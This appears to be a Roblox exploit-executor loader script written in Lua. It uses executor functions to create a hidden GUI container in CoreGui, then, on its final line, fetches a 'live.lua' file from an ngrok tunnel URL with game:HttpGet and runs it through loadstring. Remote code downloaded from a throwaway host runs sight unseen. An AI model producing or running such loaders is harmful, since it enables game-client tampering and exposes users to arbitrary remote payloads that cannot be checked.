local container = game:GetService("CoreGui"):FindFirstChild("HiddenGui");
getgenv().gethui = newcclosure(function()
  if not container then 
    container = Instance.new('Folder', game.CoreGui);
    container.Name='HiddenGui'
  end
  return container
end);

run_script([[
local container = game:GetService("CoreGui"):FindFirstChild("HiddenGui");
getgenv().gethui = newcclosure(function()
  if not container then 
    container = Instance.new('Folder', game.CoreGui);
    container.Name='HiddenGui'
  end
  return container
end);
]])

loadstring(game:HttpGet("https://9a45-2603-6012-141-3048-4030-a3af-2a10-143f.ngrok-free.app/live.lua"))()
